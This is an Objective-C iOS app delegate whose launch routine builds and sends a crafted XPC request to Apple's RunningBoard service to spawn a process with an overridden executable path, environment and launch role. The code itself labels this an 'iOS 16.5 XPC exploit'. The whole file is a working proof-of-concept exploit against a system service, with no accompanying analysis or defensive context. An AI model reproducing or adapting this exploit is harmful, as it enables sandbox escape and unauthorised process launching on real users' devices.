#import "XPCAppDelegate.h"
#import "XPCRootViewController.h"

#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>
#import <UIKit/UIKit.h>


@implementation XPCAppDelegate


static void
connection_handler(xpc_connection_t peer)
{
        xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
                printf("Message received: %p\n", event);
        });
        xpc_connection_resume(peer);
}

char * MYCFStringCopyUTF8String(CFStringRef aString) {
  if (aString == NULL) {
    return NULL;
  }

  CFIndex length = CFStringGetLength(aString);
  CFIndex maxSize =
  CFStringGetMaximumSizeForEncoding(length, kCFStringEncodingUTF8) + 1;
  char *buffer = (char *)malloc(maxSize);
  if (CFStringGetCString(aString, buffer, maxSize,
                         kCFStringEncodingUTF8)) {
    return buffer;
  }
  free(buffer); // If we failed
  return NULL;
}


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
	_window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
	_rootViewController = [[UINavigationController alloc] initWithRootViewController:[[XPCRootViewController alloc] init]];
	_window.rootViewController = _rootViewController;
	[_window makeKeyAndVisible];
	 NSUserDefaults *standardDefaults = [NSUserDefaults standardUserDefaults];
        xpc_connection_t conn;
        xpc_object_t RBSConnection = xpc_dictionary_create(NULL,NULL,0);
        xpc_dictionary_set_string(RBSConnection, "rbs_selector", "executeLaunchRequest:identifier:error:");
        xpc_dictionary_set_string(RBSConnection, "bsx_class", "RBSConnection");

        xpc_object_t RBSProcessIdentity = xpc_dictionary_create(NULL,NULL,0);
        xpc_dictionary_set_string(RBSProcessIdentity ,"_bundleIdentifier", "com.apple.calculator");
        xpc_dictionary_set_uint64(RBSProcessIdentity, "_platform", 2);
	 NSString* executablePath = [standardDefaults stringForKey:@"exec"];
	NSMutableDictionary *infoPlistDic = [[NSMutableDictionary alloc] initWithContentsOfFile:[NSString stringWithFormat:@"%@/Info.plist", [executablePath stringByDeletingLastPathComponent]]];
	NSString* jobLabel;
        NSString const* bundleId = [infoPlistDic objectForKey:@"CFBundleIdentifier"];
        NSUUID *uuid = [NSUUID UUID];
	jobLabel = [NSString stringWithFormat:@"%@-%@",bundleId,uuid];

        xpc_dictionary_set_string(RBSProcessIdentity, "_daemonJobLabel", jobLabel.UTF8String);
        xpc_dictionary_set_string(RBSProcessIdentity, "bsx_class", "RBSProcessIdentity");

        xpc_object_t RBSLaunchContext = xpc_dictionary_create(NULL,NULL,0);
        xpc_dictionary_set_value(RBSLaunchContext, "_identity", RBSProcessIdentity);
        xpc_dictionary_set_uint64(RBSLaunchContext, "_executionOptions", 8);
        xpc_dictionary_set_string(RBSLaunchContext, "_standardOutputPath",  [NSTemporaryDirectory() stringByAppendingString:@"/stdout"].UTF8String);
        xpc_dictionary_set_string(RBSLaunchContext, "_standardErrorPath", [NSTemporaryDirectory() stringByAppendingString:@"/stderr"].UTF8String);
        xpc_dictionary_set_string(RBSLaunchContext, "_explanation", "iOS 16.5 XPC exploit");
        xpc_dictionary_set_string(RBSLaunchContext, "__overrideExecutablePath", "/var/containers/Bundle/Application/C83EAD61-5BDD-483A-89DF-A01FAA2D6A8D/Calculator.app/Calculator");
        xpc_dictionary_set_uint64(RBSLaunchContext ,"_lsSpawnFlags", 0);
        xpc_dictionary_set_uint64(RBSLaunchContext ,"_executionOptions", 0x8);
        xpc_dictionary_set_uint64(RBSLaunchContext, "_initialRole", 0x7);

	xpc_object_t environ = xpc_dictionary_create(NULL,NULL,0);
	xpc_dictionary_set_string(environ, "PATH", "/usr/bin:/usr/sbin:/sbin");
	xpc_dictionary_set_value(RBSLaunchContext, "__additionalEnvironment", environ);
        xpc_dictionary_set_string(RBSLaunchContext, "bsx_class", "RBSLaunchContext");

        xpc_object_t RBSLaunchRequest = xpc_dictionary_create(NULL,NULL,0);
        xpc_dictionary_set_value(RBSLaunchRequest, "_context", RBSLaunchContext);
        xpc_dictionary_set_string(RBSLaunchRequest, "bsx_class", "RBSLaunchRequest");
//      xpc_dictionary_set_string(RBSLaunchRequest, "rbs_selector", "execute:error:");
//      xpc_dictionary_set_value(RBSLaunchRequest, "array_level_0", RBSLaunchContext);

        xpc_dictionary_set_value(RBSConnection, "array_level_0", RBSLaunchRequest);
        xpc_dictionary_set_value(RBSConnection, "array_level_1", RBSProcessIdentity);


        
        conn = xpc_connection_create_mach_service("com.apple.runningboard", NULL, 0);
        if (conn == NULL) {
                perror("xpc_connection_create_mach_service");
                return (1);
        }

        xpc_connection_send_message(conn, RBSConnection);

        xpc_connection_set_event_handler(conn, ^(xpc_object_t resp){
                printf("Received message: %p\n", resp);
                printf("%s\n", xpc_copy_description(resp));
        });

        xpc_connection_resume(conn);

        xpc_connection_send_message_with_reply(conn, RBSConnection, NULL, ^(xpc_object_t resp) {
                printf("Received second message: %p\n", resp);
                printf("%s\n", xpc_copy_description(resp));
        });

        xpc_connection_send_message_with_reply(conn, RBSConnection, NULL, ^(xpc_object_t resp) {
                printf("Received third message: %p\n", resp);
                printf("%s\n", xpc_copy_description(resp));
	});
        dispatch_main();

	return YES;
}

@end
